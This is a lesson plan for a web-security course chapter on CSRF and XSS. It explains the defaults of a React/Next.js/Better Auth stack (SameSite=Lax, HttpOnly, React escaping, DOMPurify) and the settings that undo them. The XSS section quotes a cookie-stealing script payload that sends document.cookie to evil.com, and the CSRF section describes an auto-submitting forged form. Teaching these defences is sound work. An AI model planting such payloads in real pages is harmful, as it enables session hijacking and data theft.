# CSRF and XSS: the defaults and the footguns

- Title: CSRF and XSS: the defaults and the footguns
- Sidebar label: CSRF and XSS

## Lesson framing

Chapter capstone before the quiz. Chapter 054 has been four lessons of Better Auth mechanics (proxy gate, credential mutation, session list). This lesson steps back from "wire this call" to "what is the stack already doing to keep the session you just built from being stolen or hijacked, and what one line on your side would undo it." It is deliberately code-light — almost no new primitives, one inline code example (the `DOMPurify` shape). The teaching weight is mental models and threat framing, not API surface.

Core pedagogical shape — **default + footgun, twice.** The lesson is two parallel tracks, CSRF and XSS, each taught with the identical three-beat rhythm: (1) the threat in one concrete paragraph (attacker on `evil.com`, victim signed into the app); (2) the structural default the 2026 stack already ships that closes it (cookie attribute / framework escaping) — free, no code; (3) the one footgun per category that re-opens it (`SameSite=None` / `dangerouslySetInnerHTML`), and the senior reflex that catches it. This symmetry is the lesson's backbone and the thing the student should be able to recite at the end: *the defense is structural and already on; my job is to not turn it off.*

Why this framing over an OWASP survey. The student is a junior building a 2026 SaaS with AI assistance. They do not need a taxonomy of 30 attack classes; they need to internalize that the modern stack (React 19 + Next.js 16 + Better Auth, with the hardening this course already configured) has flipped these two classic vulnerabilities from "things you implement defenses against" to "things that are defended by default unless you actively break them." The senior contribution is recognizing the footgun in a PR before it ships, not reciting attack trees. So every section ends on "what would undo this / what to flag in review," not "here are five more attacks."

The connective tissue to prior chapters is heavy and should be leaned on hard — this lesson is a *retroactive payoff* of decisions the student already made without fully seeing why:

- `SameSite=Lax` and `__Host-` prefix were set in Ch052 L3 / Ch051 L2. This lesson reveals *that those choices were the CSRF defense.*
- `HttpOnly` (Ch052 L3) was the "sessions never readable from JS" line. This lesson reveals *that it is the XSS-can't-steal-the-cookie defense.*
- `trustedOrigins` (Ch052 L3) gets reframed as Better Auth's own origin allowlist.
- The opaque-session-row model (Ch051 L2) and `requireUser` validating read (Ch052 L4) are why a CSRF-driven request that *does* slip a cookie through still fails downstream.

Mental model the student leaves with: a layered diagram — request hits cookie attribute (Lax drops it), then framework origin check (Next.js rejects), then validating read; output hits framework escaping (React escapes), then sanitization (only if you opened the `dangerouslySetInnerHTML` door), then CSP (Ch082). At each layer, the default is safe; the footgun is a specific line of code that punches a hole. The student should be able to point at a footgun and name *which layer it disables.*

Scope discipline is critical here because this lesson sits on a fault line. Full CSP configuration, the six-header `next.config.ts` set, SRI, SSRF — all Chapter 082 (the pre-launch audit project). This lesson **names CSP and the header set once each, as "the next layer, configured in Ch082," and stops.** Do not let the writer drift into teaching nonces or `strict-dynamic`. The single inline code example is the `DOMPurify` allowlist; everything else is prose + diagrams + checks.

Cognitive-load management: introduce each threat with the *concrete attacker story first* (a form on `evil.com`, a comment with a `<script>` in it) before any abstraction or attribute name. The student should feel the danger before meeting the defense. Build the layered model incrementally — one defense layer at a time, never the full stack at once.

Tone: this is the lesson where the course's "senior mindset" thesis is most visible. The recurring beat is "any time the default feels like it's in your way, the architecture is the problem, not the default." Make that reflex explicit and repeated.

## Lesson sections

### Introduction (no header)

Open with `CourseProgressBar` fed from frontmatter `course-progress` (chapter convention, all four lessons carry it).

Frame the lesson as the chapter's step-back. Three lessons spent building the session; this one asks the question every SaaS post-mortem eventually reaches — *can someone steal or hijack this session?* — and answers it with relief: for the two classic web vulnerabilities, the 2026 stack has already done most of the work. The student's job in this lesson is not to build defenses but to *understand the ones already running* and learn to spot the one line of code that would switch each off.

State the two-track structure plainly so the student has a map: CSRF (can a malicious site make requests *as* the user) and XSS (can attacker input *run as code* in the user's page). Each gets: the threat, the default that closes it, the footgun that re-opens it.

Set the scope boundary warmly here, not as a wall: this lesson is the structural layer. The full Content Security Policy and the rest of the security headers are a deliberate later pass (Chapter 082, the pre-launch audit) — named here, configured there. This keeps the student from feeling the lesson is incomplete.

Connect to what they already did: "you've already set every defense this lesson is about — back when you configured the cookie and trusted Better Auth's defaults. This lesson is where those choices finally explain themselves."

### CSRF: when the browser fights for the attacker

The CSRF threat, told as a story before any term. An attacker controls `evil.com`. They put an invisible auto-submitting `<form action="https://app.example.com/api/transfer" method="POST">` on the page. A user who is *currently signed into your app* visits `evil.com` (a phishing link, a sketchy ad). The browser, doing exactly what browsers have always done, attaches your app's session cookie to that cross-site POST — because the cookie belongs to `app.example.com` and the request is going there. Without a defense, the action runs, authenticated as the victim, who never clicked anything on your domain.

Make the key insight explicit and memorable: **CSRF is the browser's cookie-attaching behavior weaponized.** The attacker never sees or steals the cookie — they just borrow the browser's reflex to send it. That's why the defense is not "hide the cookie" but "teach the cookie when *not* to ride along."

Term: `CSRF` (Cross-Site Request Forgery) — Tooltip on first use, expand the acronym and give the one-line "tricks a logged-in user's browser into making a request they didn't intend."

Pedagogical note: this section is threat-only. The defense is the next section. Keeping threat and defense in separate sections lets the student sit in the danger long enough to value the fix. Diagram lives in the next section so it can show the *blocked* path.

### The default: SameSite=Lax drops the cookie

Reveal the payoff. Back in Chapter 052 the session cookie was configured with `SameSite=Lax` (and `__Host-`; `HttpOnly`; `Secure`). The student set this and moved on. Here is what that one attribute does: the browser sends a `Lax` cookie on *top-level navigations* to the app (the user clicks a link to `app.example.com` — cookie rides, they stay signed in, good UX) but **withholds it on cross-site subrequests** like the attacker's background POST from `evil.com`. So the forged request arrives at the app *with no session cookie.* The validating read (`requireUser`, Ch052 L4) sees no session, the action returns 401, the transfer never happens. No CSRF token, no extra code — the cookie attribute is the whole mitigation for the standard same-origin Next.js form / Server Action shape.

Drive home: this is why the course never built a CSRF-token layer. The classic synchronizer-token / double-submit machinery existed *because* cookies used to ride on every cross-site request. `SameSite=Lax` removed the premise.

DIAGRAM (the lesson's marquee visual). Sequence diagram, **Mermaid** (`sequenceDiagram`) per the diagram index (actors over time = Mermaid top pick), wrapped in `<Figure>` with caption. Pedagogical goal: make the "cookie silently dropped → 401" causal chain visible and irreversible in memory. Actors: `evil.com`, Browser, `app.example.com`. Two contrasted flows in one diagram (or a two-step `DiagramSequence` if the writer prefers scrubbing — acceptable, but a single Mermaid sequence is cleaner and shorter here, prefer it):
1. Browser already holds the `__Host-` session cookie (note over Browser).
2. `evil.com` → Browser: serves auto-submit form.
3. Browser → `app.example.com`: POST /api/transfer — annotate the arrow "SameSite=Lax → cookie NOT attached" (this is the hinge; style/color it as the chapter's violet hinge if the writer carries the palette).
4. `app.example.com` → Browser: 401 (no session) — the request runs as nobody, downstream `requireUser` short-circuits.
Caption: the attacker can make the browser send the request; they cannot make it send the cookie.

Keep the diagram short and horizontal-friendly (vertical-space constraint). Three actors max.

Term: `SameSite` — light Tooltip (cookie attribute controlling whether the cookie rides on cross-site requests; `Lax` = top-level navigations only). `Lax` itself can be defined inline in prose.

### The footgun: SameSite=None and the Domain attribute

The pivot to "what would undo it." This is the senior-reflex beat. Three ways a developer breaks the default, each with the *plausible-sounding reason* they'd reach for it (so the student recognizes the temptation in themselves):

1. **`SameSite=None`** — someone needs to embed the app in a cross-site iframe (a third-party widget, an embedded checkout) and the cookie isn't riding. The "fix" they find on Stack Overflow is `SameSite=None`. This re-opens CSRF for *every* endpoint, not just the embed. The real fix is architectural (don't drive authenticated mutations from a cross-site frame), not the attribute.
2. **Adding `Domain=example.com`** — someone wants a sibling subdomain (`marketing.example.com`) to read the session, so they drop the `__Host-` prefix (which forbids `Domain`) and add `Domain=example.com`. Now *every* subdomain — including any that an attacker might control via subdomain takeover — is in the cookie's blast radius. `__Host-` existed precisely to prevent this; removing it trades a real defense for convenience.
3. **Building a cross-site browser flow at all** (a marketing site that POSTs into the app) and "fixing the cookie" instead of fixing the flow.

The senior reflex, stated as the section's takeaway and repeated as a refrain: **any time `SameSite=Lax` or `__Host-` feels like it's blocking you, the architecture is the problem, not the cookie.** A cross-site authenticated mutation is a smell; redesign before you loosen the attribute.

Asides: a `caution` Aside on `SameSite=None` ("the moment you type this, you've turned CSRF protection off site-wide"), and a `caution` on `Domain=` / dropping `__Host-`.

### The framework's second line: the Server Actions origin check

A defense-in-depth beat that also explains the *other* surface (forms POST to API routes; Server Actions are the other mutation path). Next.js 16 Server Actions ship a built-in origin check: the framework compares the request's `Origin` header against the `Host` (and `X-Forwarded-Host`) and **rejects the Action if they don't match.** Same-origin only, unless you explicitly widen `serverActions.allowedOrigins` in `next.config.ts`. This sits *behind* `SameSite=Lax` as a second layer: even if some future browser quirk or odd embed leaked a cross-site POST past the cookie attribute, the framework still refuses the Action.

Senior reflex: `allowedOrigins` is a security-review surface. Don't widen it casually; every entry is an origin you're declaring safe to invoke your mutations. Never disable the check.

Mention briefly and accurately (fact-checked): this origin-vs-host comparison is a known, deliberate part of the framework; treat any need to widen it (reverse proxies, multi-host setups) as a reviewed decision, not a default. Keep this current — frame as "the framework checks Origin against Host" (the durable behavior), not a specific patch version.

Reframe `trustedOrigins` here as Better Auth's parallel slot: Better Auth refuses to set auth cookies on requests from origins outside `trustedOrigins` (defaults to `[baseURL]`). Add mobile-webview / extension origins explicitly when those clients exist; never `['*']`; read every addition. Two allowlists (framework + library), same discipline.

No diagram needed — this is a short "and there's a second wall behind the first" beat. A small `Aside` (note) summarizing "two layers: cookie attribute first, framework origin check second" is enough.

Optionally a tiny `Code` (ts, `next.config.ts`) showing the *shape* of `serverActions.allowedOrigins` as an array — only if it clarifies; a single line. Keep it minimal; this is not a config lesson.

### When a CSRF token actually earns its place

Close the CSRF track honestly so the student doesn't think tokens are obsolete folklore. Name the legacy pattern (cookie-to-header double-submit, synchronizer tokens) in one paragraph so they *recognize it in older codebases* — and state plainly the 2026 stack doesn't ship it because `SameSite=Lax` + the origin check close the threat for the same-origin SaaS shape.

Then the one case where it comes back: a **genuinely cross-origin auth endpoint** — e.g. a mobile webview hitting `api.example.com` from a different origin — breaks `SameSite=Lax`'s assumption (the request *is* cross-site by design). Mitigations, in senior-priority order: keep the highest-stakes endpoints `SameSite=Strict`; require a custom header the attacker site can't forge without CORS preflight cooperation; or switch those clients to a Bearer token in `Authorization` instead of a cookie. The framing: **solve the architecture first; layer tokens only when the architecture genuinely demands cross-origin.** This mirrors the footgun section's refrain — tokens are the answer when cross-origin is a real requirement, not a band-aid for a flow that shouldn't be cross-origin.

CORS named once here (the preflight is what makes a custom-header defense work); full CORS config deferred to where the cross-origin product surface appears. One-line Term on `CORS` (Cross-Origin Resource Sharing) is justified.

### XSS: when attacker input becomes code

Switch tracks. The XSS threat, again as a concrete story first. Your app renders a comment, a profile bio, a support-ticket body — text a user typed. An attacker types not text but `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` (or an `<img onerror=…>`). If your app drops that string into the page *as HTML*, the browser parses it as markup and the script runs — **in the victim's origin**, with the victim's session. From there it can read whatever JS can read, fire authenticated requests as the user, exfiltrate data.

Make the structural insight explicit: XSS is "attacker-controlled input gets parsed as HTML/JS instead of shown as text." The defense is therefore "make sure untrusted input renders as *text*, never as markup." Everything in the XSS track is a variation on that one sentence.

Tie to the cookie: note that the script tried to read `document.cookie` — and *failed* for the session cookie, because of `HttpOnly` (set in Ch052). Foreshadow the `HttpOnly`/`localStorage` section: the cookie is out of reach, which is exactly why the next temptation (tokens in `localStorage`) is dangerous.

Term: `XSS` (Cross-Site Scripting) — Tooltip on first use, expand the acronym + one-line "attacker input runs as script in another user's page."

### The default: React escapes every value

The payoff for XSS, and it's even more automatic than the CSRF one. **Every `{value}` interpolation in JSX is escaped by React.** A string renders as text, not markup. The attacker's `<script>alert(1)</script>` lands in the DOM as the literal, inert text `&lt;script&gt;alert(1)&lt;/script&gt;` — the browser shows the characters, never parses a tag. The app gets this *for free* on every value it writes; there is no "turn on escaping" step because it's never off.

Small concrete before/after to cement it — a tiny illustrative pairing (can be a `Code` block or two-line prose, writer's call; keep it tiny): `<div>{comment}</div>` where `comment` is the malicious string → renders as visible text, no execution. This is the entire default defense for the overwhelming majority of rendering the student will ever write.

Add the `href` nuance accurately (fact-checked, this is a known footgun-ish corner): React also guards against `javascript:` URLs in JSX-rendered attributes — historically a dev-mode warning ("A future version of React will block javascript: URLs"), and the safe assumption for the student is *don't rely on the version-specific behavior; validate URLs yourself.* So `<a href={url}>` with an attacker-supplied `javascript:alert(1)` URL is the one place auto-escaping doesn't fully save you, and it leads into the "other vectors" section. Don't overstate React's guarantee here — frame as "React helps, you still validate the scheme."

DIAGRAM (small, optional but valuable). A simple two-column **HTML+CSS** `<Figure>` (or `TabbedContent` with two panels) — "same malicious string, two sinks": left panel `{value}` → rendered as escaped text (show the literal `&lt;script&gt;…` and a "inert, displayed as text" chip); right panel `dangerouslySetInnerHTML` → rendered as live markup (show a "parsed as HTML — script runs" chip in red, chapter palette). Pedagogical goal: the student *sees* that the danger isn't the input, it's the sink — the same string is harmless or catastrophic depending on which prop receives it. This visual carries the whole XSS mental model and motivates the next section. Keep it compact and horizontal. Reuse chapter palette (red = the dangerous sink) and `.sar-chip` vocabulary for the chips if the writer is carrying the chapter's visual language.

### The footgun: dangerouslySetInnerHTML

The one prop that bypasses the auto-escape, and the name is the warning. `<div dangerouslySetInnerHTML={{ __html: userInput }} />` injects the string as raw HTML — exactly the sink the diagram showed. Any path from attacker-controllable input to that prop is an XSS hole.

The senior reflexes, as a short ordered discipline (these are the takeaways the quiz will hit):
- Don't reach for it without a load-bearing reason (rendering rich text / sanitized CMS HTML is the only common legitimate one).
- When you do reach for it, **sanitize the input first** — `DOMPurify` is the 2026 standard.
- Sanitize **server-side**, not in the browser — since this is RSC, render the sanitized HTML on the server so the un-sanitized string never reaches the client at all. (Client-only sanitization still ships the dangerous string to the browser — a real, common mistake.)
- **Allowlist** tags/attributes (whitelist what's permitted), never blocklist (you'll never enumerate every dangerous tag).
- Sanitize even "trusted" sources (your own CMS) — the senior assumes every input is reachable by *some* path.

THE ONE INLINE CODE EXAMPLE. A single `Code` (ts) block — the `DOMPurify` allowlist shape, server-side. This is the only real code in the lesson; make it count. Shape (align with Code conventions §"Sanitize any `dangerouslySetInnerHTML` input through `DOMPurify`. The default is to refuse the input"):

```ts
import DOMPurify from 'isomorphic-dompurify'

const clean = DOMPurify.sanitize(richText, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
  ALLOWED_ATTR: ['href'],
  ALLOWED_URI_REGEXP: /^https?:\/\//i,
})
// clean is now safe to pass to dangerouslySetInnerHTML, server-side
```

Use `isomorphic-dompurify` (fact-checked: the recommended package for server/RSC because plain `dompurify` needs a DOM that Node lacks; isomorphic wraps jsdom). Consider `CodeTooltips` on `ALLOWED_TAGS` / `ALLOWED_ATTR` / `ALLOWED_URI_REGEXP` to explain each as "allowlist of tags / allowlist of attributes / restrict URL schemes" without breaking flow — this is exactly the CodeTooltips use case (short inline definitions on a single block). The senior framing in prose: **the sanitizer config is part of your security posture — review it like a firewall rule.**

`caution` Aside: "sanitizing in a client component still shipped the raw HTML to the browser — sanitize on the server."

### The vectors React doesn't close for you

Round out XSS with the corners auto-escaping doesn't cover, kept tight (this is a "stay alert here" list, not a deep dive):
- **`href` / `src` with untrusted URLs** — validate the scheme: allow `https:`, `mailto:`, relative paths; reject `javascript:` and friends. (Connects back to the React `href` nuance — React helps in JSX but you validate.) This is a real PR-review footgun: `<a href={userUrl}>` with no scheme check.
- **`target="_blank"` and `rel="noopener noreferrer"`** — frame accurately (fact-checked): modern browsers *now imply* `rel="noopener"` for `target="_blank"` automatically (a browser standard, not a React feature — don't claim React adds it), so the window-opener hijack is mostly closed by the browser. The still-meaningful explicit add is `noreferrer` (referrer-privacy: don't leak the originating URL to the opened page). Senior default: write `rel="noopener noreferrer"` explicitly anyway — belt-and-suspenders plus the referrer benefit, and it documents intent.
- **`eval` / `new Function` / `setTimeout(stringArg)` with user input** — never; ESLint catches these. One line, named so the student knows the category exists.
- Note that `style` as a *string* (the `background:url(javascript:…)` trick) only reaches the page through `dangerouslySetInnerHTML` — already covered; object `style={{…}}` is safe.

EXERCISE (the lesson's main interactive check). A `Buckets` classification drag-and-drop fits the lesson's "recognize safe vs footgun" goal perfectly and matches the chapter's MCQ-light interactive budget. Two buckets: **"Safe by default"** and **"Footgun — opens a hole."** Items to sort (mix CSRF + XSS so it tests the whole lesson):
- `<div>{userComment}</div>` → safe
- `<div dangerouslySetInnerHTML={{ __html: userComment }} />` → footgun
- session cookie with `SameSite=Lax` → safe
- session cookie flipped to `SameSite=None` → footgun
- `<a href={validatedHttpsUrl}>` → safe
- `<a href={rawUserUrl}>` (no scheme check) → footgun
- `__Host-` prefixed cookie → safe
- cookie with `Domain=example.com` added → footgun
- auth token in `localStorage` → footgun
- session in `HttpOnly` cookie → safe
Grading: each item in the correct bucket. This drills the exact recognition skill the lesson teaches and the senior PR-review reflex. (If `Buckets` two-column layout gets crowded, the writer can split into a CSRF round and an XSS round, but one combined exercise is preferred to reinforce the unified "default vs footgun" model.)

### HttpOnly and the localStorage line

The cookie-theft angle, paying off the foreshadowing from the XSS-threat section. `HttpOnly` (set by Better Auth on the session cookie, Ch052) means **JavaScript cannot read the cookie** — `document.cookie` doesn't include it. So even a successful XSS can't exfiltrate the session cookie directly; this is why the attacker's `fetch('…'+document.cookie)` came up empty for the session.

The trade and the rule: the moment a team puts an auth credential in `localStorage` "for convenience," they've put it somewhere *every script can read* — and a single XSS reads it. The senior rule, stated flatly: **session cookies stay `HttpOnly`; auth tokens never go in `localStorage`.** If an architecture genuinely needs a JS-readable token, name the threat explicitly and pick the least-bad layer (in-memory only, short-lived, with refresh) — never `localStorage` as a default.

`danger` Aside (this one is strong enough for danger, not caution): "an auth token in `localStorage` is readable by every script on the page — one XSS and it's gone. `HttpOnly` cookies are the default for a reason."

This section is prose-only; the rule is the deliverable.

### The next layer: Content Security Policy

The honest "and there's more, later" close for the XSS track — and the place the scope boundary is set firmly. Even with escaping and sanitization, a CSP is the defense-in-depth that catches the case where sanitization has a gap: a `Content-Security-Policy` header that forbids inline scripts and only permits scripts from `'self'` means an injected `<script>` *won't execute even if it slips into the DOM.* It is the right reach for production SaaS handling sensitive data — the second wall behind escaping/sanitization.

Then stop, deliberately and visibly: the *configuration* depth — nonces, hashes, `strict-dynamic`, report-only rollout — is **Chapter 082** (the pre-launch audit pass), where the project ships the real header set in `next.config.ts` and a nonce-based CSP in `proxy.ts`. Name the position in the stack (third layer, after escaping and sanitization) and the fact that it's mandatory for sensitive-data SaaS; do not configure it here.

Name the rest of the security-header surface in one sentence — `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-*` — as "shipped via `next.config.ts`'s `headers()`, the full set is Chapter 082." Senior one-liners only (e.g. `nosniff` always; HSTS preloaded in production). Do not ship the set.

`note` Aside cross-linking forward to Chapter 082 so the student has the pointer.

Pedagogical reason this section exists despite being out-of-scope-to-build: it completes the layered mental model (the student needs to know CSP *is the next layer* so the model has a roof), and it sets the expectation honestly so the lesson doesn't feel like it claimed escaping+sanitization were the whole story.

### The mental model: layers, defaults, and the lines that punch through

Short synthesis section — the takeaway the student carries out. Restate the layered model as one picture and one sentence.

DIAGRAM (the closing synthesis visual). An **HTML+CSS** layered "defense stack" `<Figure>` (annotated illustration = HTML+CSS per the index), two parallel columns (CSRF | XSS) of stacked layers, each layer labeled with its default and, beside it, the footgun that disables *that specific layer*:

CSRF column (request side), top to bottom:
- Layer: `SameSite=Lax` cookie → footgun chip: `SameSite=None`
- Layer: `__Host-` (no `Domain`) → footgun chip: `Domain=` added
- Layer: Server Actions origin check → footgun chip: widened `allowedOrigins`
- Layer: validating read (`requireUser`) → (the always-on backstop)

XSS column (output side), top to bottom:
- Layer: React auto-escaping (`{value}`) → footgun chip: `dangerouslySetInnerHTML` unsanitized
- Layer: URL scheme validation → footgun chip: raw `href={userUrl}`
- Layer: `HttpOnly` cookie → footgun chip: token in `localStorage`
- Layer: CSP (Ch082) → (the roof, later)

Pedagogical goal: one glance shows the lesson's thesis — every layer is safe by default, and each footgun is a *specific line that disables one specific layer.* Use the chapter palette: green for the safe default layers, red for the footgun chips. Reuse `.sar-chip` styling for consistency with the chapter's other figures. Keep it compact and horizontal (two side-by-side columns, capped height).

Close on the refrain, now earned: the 2026 stack ships these defenses on by default; the senior job is to recognize, in a PR, the one line that turns one off — and to fix the architecture rather than loosen the default. That recognition is the deliverable of this lesson.

Optional final MCQ (`MultipleChoice`) as a quick recall check if the writer wants a second interactive beat after `Buckets` — e.g. "which line undoes CSRF protection site-wide?" with `SameSite=None` correct. Keep to one; the chapter is MCQ-light and `Buckets` is the primary check.

### External resources (optional)

A small `CardGrid` of `ExternalResource` cards — high-signal, current, 2026-relevant only:
- MDN `SameSite` cookies attribute (the durable reference for the CSRF default).
- DOMPurify (official) — the sanitizer.
- Next.js Server Actions / data-security docs — the origin-check behavior.
- OWASP XSS prevention cheat sheet — *named as reference, not survey* (the canonical industry doc the student will meet).
Keep to ~3–4 cards; do not turn this into a reading list.

## Scope

This lesson teaches the **structural defaults** the 2026 stack ships for CSRF and XSS, the **one footgun per category** that undoes each, and the `DOMPurify` sanitization shape. It is concept-and-pattern, deliberately code-light (one inline code example).

Prerequisites to redefine *concisely* (do not re-teach — these were built earlier in the chapter/unit; one clause each):
- Session cookie flags `__Host-`, `HttpOnly`, `Secure`, `SameSite=Lax` (Ch052 L3 / Ch051 L2) — referenced as already-configured; this lesson reveals their security *purpose*, doesn't re-configure them.
- The validating read `requireUser` / `auth.api.getSession` (Ch052 L4) — named as the downstream backstop that rejects a session-less forged request; not re-taught.
- Opaque-session-row model (Ch051 L2) — named once as why a slipped-through request still fails downstream.
- `trustedOrigins` (Ch052 L3) — reframed, not reconfigured.
- Server Actions / `useActionState` form shape (Ch043/045, used through Ch054) — assumed known; this lesson only touches the framework's origin check on them.

Explicitly **out of scope** (belongs elsewhere — do not teach):
- **Full CSP configuration** — nonces, hashes, `strict-dynamic`, report-only rollout, the nonce-based CSP in `proxy.ts`. **Chapter 082** (pre-launch audit). Named once here as "the next layer."
- **The full security-header set** in `next.config.ts` (`headers()`: HSTS, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-*`). **Chapter 082.** Named in one sentence; not shipped.
- **Subresource Integrity** for third-party scripts — Chapter 082.
- **SSRF, log injection, deserialization** — Chapter 082 / Unit 16.
- **The OWASP top-10 survey** — covered by example (these two vulns), never by enumeration. Cheat sheet linked as reference only.
- **Full CORS configuration** for cross-origin API endpoints — named once (the preflight is what makes a custom-header CSRF defense work); full coverage deferred to where the cross-origin product surface appears.
- **Rate limiting** auth endpoints — Chapter 074; named at most as a parallel defense, not taught.
- **The proxy gate / matcher / `?next=`** — Ch054 L1; this lesson does not touch routing.
- **Credential-mutation forms and session revocation** — Ch054 L2/L3; not revisited except the one-line callback that `revokeOtherSessions` was the CSRF-adjacent "kill stolen sessions" move (do not re-teach).

Do not let the lesson drift into a header-configuration tutorial. The boundary with Chapter 082 is the single most important scope line: **this lesson names CSP and the header set; Chapter 082 configures them.**
